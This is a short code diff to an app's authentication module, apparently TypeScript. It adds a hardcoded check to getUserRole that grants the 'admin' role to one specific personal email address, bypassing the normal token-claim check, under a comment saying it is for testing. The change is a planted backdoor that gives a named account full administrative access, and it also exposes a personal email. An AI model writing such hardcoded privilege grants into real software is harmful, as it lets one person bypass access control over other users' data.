@@ -53,6 +53,11 @@ export const resetPassword = async (email: string) => {
 };
 
 export const getUserRole = async (user: User): Promise<UserRole> => {
+  // Hardcoded admin access for testing
+  if (user.email === 'ayushkrsingh91131@gmail.com') {
+    return 'admin';
+  }
+
   const tokenResult = await user.getIdTokenResult();
   if (tokenResult.claims.role === 'admin') {
     return 'admin';
